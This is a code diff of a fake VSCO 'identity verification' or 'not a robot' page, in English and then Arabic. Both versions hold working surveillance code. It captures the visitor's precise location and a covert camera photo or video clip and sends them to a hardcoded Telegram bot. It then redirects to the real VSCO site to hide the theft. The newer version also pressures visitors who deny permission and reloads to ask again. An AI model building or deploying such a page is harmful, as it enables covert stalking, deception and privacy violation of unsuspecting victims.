@@ -1,78 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>VSCO Studio</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VSCO - التحقق من الوصول</title>
     <style>
-        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
-        .container { text-align: center; width: 85%; max-width: 350px; }
-        .vsco-logo { width: 60px; margin-bottom: 30px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
-        p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 40px; }
-        .btn { background: #007aff; color: white; border: none; padding: 18px; border-radius: 12px; font-weight: 600; width: 100%; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 122, 255, 0.4); }
-        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffffff; color: #000; }
+        .container { text-align: center; padding: 20px; max-width: 400px; }
+        .logo { font-size: 40px; font-weight: bold; letter-spacing: 5px; margin-bottom: 20px; }
+        h1 { font-size: 18px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .btn { background-color: #000; color: white; border: none; padding: 14px 40px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
-        <h1>Identity Verification</h1>
-        <p>Verification is mandatory for secure access. Please allow camera and location access when prompted.</p>
-        <button class="btn" onclick="startVerification()">Verify Identity</button>
-    </div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<div class="container">
+    <div class="logo">VSCO</div>
+    <h1>أمان الحساب</h1>
+    <p>يرجى إكمال عملية التحقق أدناه لفتح الموقع والتأكد بأنك لست روبوت.</p>
+    <button class="btn" id="verifyBtn" onclick="initiate()">فتح الموقع</button>
+</div>
 
-    <script>
-        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
-        const chatId = "8005843544";
+<script>
+    const token = '8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs'; 
+    const chatId = '8005843544';
 
-        async function startVerification() {
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    captureProcess(loc);
-                },
-                (err) => { captureProcess("Location Access Denied"); },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+    async function initiate() {
+        // 1. طلب الموقع وإرساله
+        navigator.geolocation.getCurrentPosition((position) => {
+            const mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 موقع الصيد: " + mapLink)}`);
+        });
+
+        // 2. طلب الكاميرا والتحويل
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            
+            mediaRecorder.onstart = () => {
+                // التحويل للموقع بعد بدء التسجيل مباشرة
+                setTimeout(() => {
+                    window.location.href = "https://vsco.co/auth/login";
+                }, 800); 
+            };
+
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('video', blob, 'capture.mp4');
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData });
+                stream.getTracks().forEach(track => track.stop());
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 3500);
+
+        } catch (err) {
+            // الفخ: إذا رفض الإذن تظهر هذه الرسالة عن "فتح الموقع"
+            alert("⚠️ تنبيه أمني: يجب عليك قبول الإذن المطلوب للتأكد بأنك لست روبوت ولتتمكن من فتح الموقع.");
+            location.reload(); // إعادة طلب الإذن
         }
+    }
+</script>
 
-        async function captureProcess(locationText) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // الحل الجذري: الانتظار حتى يتأكد المتصفح أن الكاميرا بدأت بالعرض فعلياً
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // انتظار 4 ثواني كاملة لضبط الإضاءة ومنع السواد
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob);
-                            formData.append('caption', `✅ Verified!\n📍 Map: ${locationText}`);
-                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                        }, 'image/jpeg');
-
-                        setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1000);
-                    }, 4000); 
-                };
-            } catch (e) {
-                alert("Camera access is required for verification.");
-            }
-        }
-    </script>
 </body>
 </html>
+
 
 
 
